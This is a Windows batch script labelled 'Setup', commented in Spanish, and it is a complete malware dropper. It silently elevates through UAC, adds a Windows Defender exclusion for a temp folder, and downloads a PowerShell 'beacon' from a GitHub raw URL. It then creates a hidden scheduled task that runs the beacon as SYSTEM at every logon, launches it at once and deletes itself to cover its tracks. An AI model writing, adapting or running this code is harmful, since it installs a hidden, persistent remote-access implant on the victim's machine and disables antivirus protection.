@echo off
title Setup
rem ============================================================
rem  Un clic, un UAC y listo: instala el beacon como SYSTEM.
rem  Sin logs. El beacon se descarga del repo.
rem ============================================================

rem ---- Autoelevacion: pedir UAC una vez y seguir oculto ----
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

rem ---- Ya elevado y oculto: hacer el trabajo ----
set CACHE=C:\Windows\temp\Cache

if not exist "%CACHE%" mkdir "%CACHE%" >nul 2>&1

rem 1) Excluir la carpeta de Defender
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%CACHE%'" >nul 2>&1

rem 2) Descargar el beacon
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/R0b0tik0/shell/refs/heads/main/beacon.ps1' -OutFile '%CACHE%\beacon.ps1'" >nul 2>&1

rem 3) Persistencia: tarea al inicio de sesion corriendo como SYSTEM (sin ventana)
schtasks /create /tn Shelzy /tr "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File %CACHE%\beacon.ps1" /sc onlogon /ru SYSTEM /f >nul 2>&1

rem 4) Ejecutar el beacon AHORA (SESSION SYSTEM, sin ventana)
schtasks /run /tn Shelzy >nul 2>&1

rem 5) Auto-borrarse (el proceso elevado se elimina a si mismo)
del "%~f0" >nul 2>&1
exit /b